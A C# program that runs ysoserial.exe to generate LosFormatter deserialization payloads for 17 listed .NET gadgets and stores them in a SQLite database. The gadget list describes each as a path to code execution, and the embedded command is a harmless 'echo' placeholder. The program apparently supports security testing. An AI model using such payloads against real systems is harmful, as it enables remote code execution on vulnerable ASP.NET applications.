using System.Diagnostics;
using Microsoft.Data.Sqlite;

// Gadgets that support LosFormatter, with their command requirements
var gadgets = new List<GadgetInfo>
{
    new("ActivitySurrogateDisableTypeCheck", NeedsCommand: false, Description: "Disables 4.8+ type protections for ActivitySurrogateSelector"),
    new("ActivitySurrogateSelector", NeedsCommand: true, Description: "Arbitrary code execution via workflow activity surrogate"),
    new("TextFormattingRunProperties", NeedsCommand: true, Description: "Code execution via XAML payload in TextFormattingRunProperties"),
    new("TypeConfuseDelegate", NeedsCommand: true, Description: "Code execution via confused delegate types"),
    new("ClaimsPrincipal", NeedsCommand: true, Description: "Code execution via ClaimsPrincipal deserialization"),
    new("ClaimsIdentity", NeedsCommand: true, Description: "Code execution via ClaimsIdentity deserialization"),
    new("GenericPrincipal", NeedsCommand: true, Description: "Code execution via GenericPrincipal deserialization"),
    new("WindowsIdentity", NeedsCommand: true, Description: "Code execution via WindowsIdentity deserialization"),
    new("WindowsPrincipal", NeedsCommand: true, Description: "Code execution via WindowsPrincipal deserialization"),
    new("SessionSecurityToken", NeedsCommand: true, Description: "Code execution via SessionSecurityToken deserialization"),
    new("RolePrincipal", NeedsCommand: true, Description: "Code execution via RolePrincipal deserialization"),
    new("AxHostState", NeedsCommand: true, Description: "Code execution via AxHost.State deserialization"),
    new("DataSet", NeedsCommand: true, Description: "Code execution via DataSet deserialization"),
    new("PSObject", NeedsCommand: true, Description: "Code execution via PowerShell PSObject deserialization"),
    new("ResourceSet", NeedsCommand: true, Description: "Code execution via ResourceSet deserialization"),
    new("ToolboxItemContainer", NeedsCommand: true, Description: "Code execution via ToolboxItemContainer deserialization"),
    new("TypeConfuseDelegateMono", NeedsCommand: true, Description: "TypeConfuseDelegate variant for Mono runtime"),
};

string ysoserialPath = args.Length > 0 ? args[0] : @"D:\projects\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe";
string dbPath = args.Length > 1 ? args[1] : Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "payloads.db");
string placeholderCommand = "echo sharpnix";

// Resolve relative db path
dbPath = Path.GetFullPath(dbPath);

Console.WriteLine($"ysoserial.exe path: {ysoserialPath}");
Console.WriteLine($"Database path: {dbPath}");
Console.WriteLine();

// Create/reset database
if (File.Exists(dbPath))
    File.Delete(dbPath);

using var connection = new SqliteConnection($"Data Source={dbPath}");
connection.Open();

using var createCmd = connection.CreateCommand();
createCmd.CommandText = """
    CREATE TABLE payloads (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        gadget TEXT NOT NULL,
        command TEXT NOT NULL,
        payload_base64 TEXT NOT NULL,
        description TEXT,
        needs_command INTEGER NOT NULL DEFAULT 1,
        created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );
    CREATE UNIQUE INDEX idx_gadget_command ON payloads(gadget, command);
    """;
createCmd.ExecuteNonQuery();

int successCount = 0;
int failCount = 0;

foreach (var gadget in gadgets)
{
    string command = gadget.NeedsCommand ? placeholderCommand : "ignored";

    Console.Write($"  {gadget.Name,-45} ");

    try
    {
        string payload = RunYsoserial(ysoserialPath, gadget.Name, command);

        if (string.IsNullOrWhiteSpace(payload))
        {
            Console.WriteLine("[EMPTY - skipped]");
            failCount++;
            continue;
        }

        // Validate it's valid base64
        try
        {
            Convert.FromBase64String(payload.Trim());
        }
        catch
        {
            Console.WriteLine("[INVALID BASE64 - skipped]");
            failCount++;
            continue;
        }

        using var insertCmd = connection.CreateCommand();
        insertCmd.CommandText = """
            INSERT INTO payloads (gadget, command, payload_base64, description, needs_command)
            VALUES (@gadget, @command, @payload, @description, @needsCommand)
            """;
        insertCmd.Parameters.AddWithValue("@gadget", gadget.Name);
        insertCmd.Parameters.AddWithValue("@command", command);
        insertCmd.Parameters.AddWithValue("@payload", payload.Trim());
        insertCmd.Parameters.AddWithValue("@description", gadget.Description);
        insertCmd.Parameters.AddWithValue("@needsCommand", gadget.NeedsCommand ? 1 : 0);
        insertCmd.ExecuteNonQuery();

        Console.WriteLine($"[OK] ({payload.Trim().Length} chars)");
        successCount++;
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[FAILED: {ex.Message}]");
        failCount++;
    }
}

Console.WriteLine();
Console.WriteLine($"Done: {successCount} succeeded, {failCount} failed");
Console.WriteLine($"Database: {dbPath}");

// List what's in the DB
using var listCmd = connection.CreateCommand();
listCmd.CommandText = "SELECT gadget, length(payload_base64), description FROM payloads ORDER BY gadget";
using var reader = listCmd.ExecuteReader();
Console.WriteLine();
Console.WriteLine($"{"Gadget",-45} {"Size",-10} Description");
Console.WriteLine(new string('-', 100));
while (reader.Read())
{
    Console.WriteLine($"{reader.GetString(0),-45} {reader.GetInt32(1),-10} {reader.GetString(2)}");
}

static string RunYsoserial(string exePath, string gadget, string command)
{
    // Determine how to invoke: if on WSL and path is a Windows path, call it directly
    // WSL can execute Windows .exe files natively
    var psi = new ProcessStartInfo
    {
        FileName = exePath,
        Arguments = $"-g {gadget} -f LosFormatter -c \"{command}\"",
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        UseShellExecute = false,
        CreateNoWindow = true,
    };

    using var process = Process.Start(psi)!;
    string stdout = process.StandardOutput.ReadToEnd();
    string stderr = process.StandardError.ReadToEnd();
    process.WaitForExit(TimeSpan.FromSeconds(30));

    if (process.ExitCode != 0 && string.IsNullOrWhiteSpace(stdout))
    {
        throw new Exception(stderr.Trim().Split('\n')[0]);
    }

    // ysoserial may output extra lines (warnings, etc.) — the payload is typically the last non-empty line
    var lines = stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries);
    return lines.Length > 0 ? lines[^1].Trim() : "";
}

record GadgetInfo(string Name, bool NeedsCommand, string Description);
